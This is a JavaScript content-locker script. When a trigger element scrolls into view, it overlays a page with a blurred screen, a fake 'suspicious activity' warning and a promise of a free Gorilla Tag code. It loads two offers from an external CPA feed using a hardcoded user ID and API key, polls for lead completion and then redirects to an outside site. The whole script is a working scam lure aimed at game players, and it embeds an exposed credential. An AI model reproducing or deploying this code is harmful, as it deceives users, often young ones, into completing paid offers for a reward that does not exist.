 (function() {
        function _eN() {
            if (document.getElementById('dynamic-content-locker')) {
                return;
            }
            var lockerHTML = `
                <style>
                    @import url('https://fonts.googleapis.com/css2?family=Comfortaa:wght@400;700&display=swap');
                    .locker-overlay {
                        position: fixed;
                        top: 0; left: 0;
                        width: 100%; height: 100%;
                        background: rgba(0, 0, 0, 0.7); 
                        backdrop-filter: blur(5px);
                        -webkit-backdrop-filter: blur(5px);
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        z-index: 999999;
                        font-family: 'Comfortaa', sans-serif;
                    }
                    .locker-container {
                        background: #111111; 
                        width: 100%;
                        max-width: 440px;
                        padding: 35px 25px;
                        border-radius: 25px;
                        border: 1px solid #333;
                        box-shadow: 0 0 20px rgba(0, 0, 0, 0.8), 0 0 10px rgba(255, 255, 255, 0.1);
                        text-align: center;
                        position: relative;
                        border-radius: 20px/50%;                        
                        border-right: 1px solid #ffffff29;
                        box-shadow: 0 15px 10px -10px rgba(0, 0, 0, 0.4), 0 0 7px rgba(255, 255, 255, 0.7);
                        animation: glow-rotate 3s linear infinite;
                    }  
                    .game-logo {
                        max-width: 160px;
                        margin-bottom: 25px;
                    }
                    .message-box {
                        text-align: left; 
                        color: #fff;
                        margin-bottom: 25px;
                    }
                    .message-box strong {
                        display: block;
                        font-size: 17px;
                        line-height: 1.5;
                        margin-bottom: 10px;
                    }
                    .blue-text {
                        color: #fff;
                        font-weight: bold;
                    }
                    #offerContainer_dynamic {
                        display: flex;
                        flex-direction: column;
                        gap: 15px;
                    }
                    .offer-btn {
                        display: flex;
                        align-items: center;
                        padding: 15px;
                        border-radius: 20px;
                        text-decoration: none;
                        transition: all 0.3s ease;
                        border: 1px solid #ffffff29;
                        background: linear-gradient(0deg,#cd7724,#cd7724 49.5%,#ec9f38 60%,#fdeca9 95%,#efb741);
                        box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
                        border-radius: 20px/50%;                        
                        border-right: 1px solid #ffffff29;
                    }
                    .offer-btn:nth-child(1) {
                        background: linear-gradient(180deg, #0667c7 0%, #034a8e 100%);
                        border-left: 5px solid #00d2ff;
                    }
                    .offer-btn:nth-child(2) {
                        background: linear-gradient(180deg, #0667c7 0%, #034a8e 100%);
                        border-left: 5px solid #00d2ff;
                    }
                    .offer-btn:hover {
                        transform: translateY(-3px);
                        filter: brightness(1.2);
                        box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
                    }
                    .offer-icon {
                        width: 50px;
                        height: 50px;
                        border-radius: 12px;
                        margin-right: 15px;
                        border: 1px solid rgba(255,255,255,0.2);
                        background: linear-gradient(0deg,#cd7724,#cd7724 49.5%,#ec9f38 60%,#fdeca9 95%,#efb741);
                        border-radius: 20px/50%;                        
                        border-right: 1px solid #ffffff29;
                        box-shadow: 0 15px 10px -10px rgba(0, 0, 0, 0.4), 0 0 7px rgba(255, 255, 255, 0.7);
                        animation: glow-rotate 3s linear infinite;
                    }
                    .offer-info {
                        flex: 1;
                        text-align: left;
                    }
                    .offer-name {
                        display: block;
                        color: #fff;
                        font-weight: 700;
                        font-size: 14px;
                    }
                    .offer-sub {
                        display: block;
                        color: #e0e0e0;
                        font-size: 11px;
                    }
                    .status-footer {
                        margin-top: 25px;
                        color: #888;
                        font-size: 11px;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        gap: 8px;
                    }
                    .dot {
                        width: 8px;
                        height: 8px;
                        background: #00d2ff;
                        border-radius: 50%;
                        animation: blink 0.8s infinite alternate;
                    }
                    @keyframes blink { from { opacity: 0.2; } to { opacity: 1; } }
                </style>
                <div class="locker-overlay" id="dynamic-content-locker">
                    <div class="locker-container">
                        <img src="https://cdn.jsdelivr.net/gh/monorolls/grow@main/tagg.png" alt="Logo" class="game-logo">
                        <div class="message-box">
                            <strong>We have detected suspicious activity.</strong>
                            <strong>To continue and get your free Gorilla Tag code, please complete one of the tasks below.
Once the task is completed, this page will unlock automatically and you will receive your code.</strong>
                        </div>
                        <div id="offerContainer_dynamic">
                            <p style="color:#666; font-size:12px;">Loading exclusive offers...</p>
                        </div>
                        <div class="status-footer">
                            <div class="dot"></div>
                            <span>Waiting for completion...</span>
                        </div>
                    </div>
                </div>`;
            
            document.body.insertAdjacentHTML('beforeend', lockerHTML);

            if (typeof jQuery == 'undefined') {
                var script = document.createElement('script');
                script.src = 'https://ajax.googleapis.com/ajax/libs/jquery/1.12.4/jquery.min.js';
                script.onload = function() { initLockerLogic(); };
                document.head.appendChild(script);
            } else {
                initLockerLogic();
            }

            function initLockerLogic() {
                var $ = window.jQuery;
                var userID = "511022";
                var apiKey = "3197b8ec5712836c30c668f82c8c6e4a";
                var finalLink = "https://m.rolls3.com/"; 
                $.getJSON("https://d1y3y09sav47f5.cloudfront.net/public/offers/feed.php?user_id="+userID+"&api_key="+apiKey+"&callback=?",
                    function(offers){
                        var html = '';
                        var selected = offers.slice(0, 2); 
                        $.each(selected, function(i, offer){
                            var img = offer.network_icon ? offer.network_icon : 'https://via.placeholder.com/50';
                            html += '<a href="'+offer.url+'" target="_blank" class="offer-btn">';
                            html += '  <img src="'+img+'" class="offer-icon">';
                            html += '  <div class="offer-info">';
                            html += '    <span class="offer-name">'+offer.anchor+'</span>';
                            html += '    <span class="offer-sub">'+offer.conversion+'</span>';
                            html += '  </div>';
                            html += '</a>';
                        });
                        $('#offerContainer_dynamic').html(html);
                    }
                );
                setInterval(function() {
                    $.getJSON("https://d1y3y09sav47f5.cloudfront.net/public/external/check2.php?testing=0&callback=?", 
                        function (leads) {
                            if (leads.length > 0) {
                                window.location.href = finalLink;
                            }
                        }
                    );
                }, 15000);
            }
        }

        var observer = new IntersectionObserver(function(entries) {
            if(entries[0].isIntersecting) {
                _eN();
                observer.disconnect();
            }
        }, { threshold: 0.1 });

        observer.observe(document.getElementById('locker-trigger-point'));
    })();
